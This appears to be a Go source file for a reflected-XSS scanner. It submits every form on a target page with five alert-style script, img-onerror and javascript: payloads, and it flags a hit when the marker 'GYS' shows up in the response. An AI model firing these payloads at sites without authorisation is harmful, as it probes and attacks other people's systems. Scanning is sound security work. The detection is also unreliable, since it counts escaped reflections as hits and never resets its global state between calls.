package Protocol

import (
	"github.com/PuerkitoBio/goquery"
	"io"
	"net/http"
	"net/url"
	"strings"
)

var (
	foundXSS = false
	ply      = ""
)

func CheckXss(targetURL string) (bool, string) {
	xssPayloads := []string{
		`<sCrIpt>alert("GYS")</SCriPt>`,
		`<img src=x onerror=alert("GYS")>`,
		`<div onmouseover="alert('GYS')">`,
		`<sCrIpt\x09>javascript:alert('GYS')</SCriPt>`,
		`<IMG SRC="javascript:alert('GYS');">`,
	}

	resp, err := http.Get(targetURL)
	if err != nil {
		return false, ""
	}
	defer resp.Body.Close()

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return false, ""
	}

	baseURL, err := url.Parse(targetURL)
	if err != nil {
		return false, ""
	}

	doc.Find("form").Each(func(i int, form *goquery.Selection) {
		formAction, _ := form.Attr("action")
		formMethod, _ := form.Attr("method")

		if formMethod == "" {
			formMethod = "GET"
		}

		actionURL, err := url.Parse(formAction)
		if err != nil {
			return
		}

		absURL := baseURL.ResolveReference(actionURL)

		for _, payload := range xssPayloads {
			data := url.Values{}
			form.Find("input").Each(func(i int, input *goquery.Selection) {
				inputName, _ := input.Attr("name")
				inputValue, _ := input.Attr("value")
				if inputName != "" {
					data.Set(inputName, inputValue+payload)
				}
			})

			var response *http.Response
			if strings.ToUpper(formMethod) == "POST" {
				response, err = http.PostForm(absURL.String(), data)
			} else {
				response, err = http.Get(absURL.String() + "?" + data.Encode())
			}

			if err != nil {
				continue
			}

			body, err := io.ReadAll(response.Body)
			if err != nil {
				continue
			}
			response.Body.Close()

			_, err = goquery.NewDocumentFromReader(strings.NewReader(string(body)))
			if err != nil {
				continue
			}

			if strings.Contains(string(body), "GYS") {
				foundXSS = true
				ply = payload
				break
			}
		}
	})

	if foundXSS {
		return true, ply
	}
	return false, ""
}
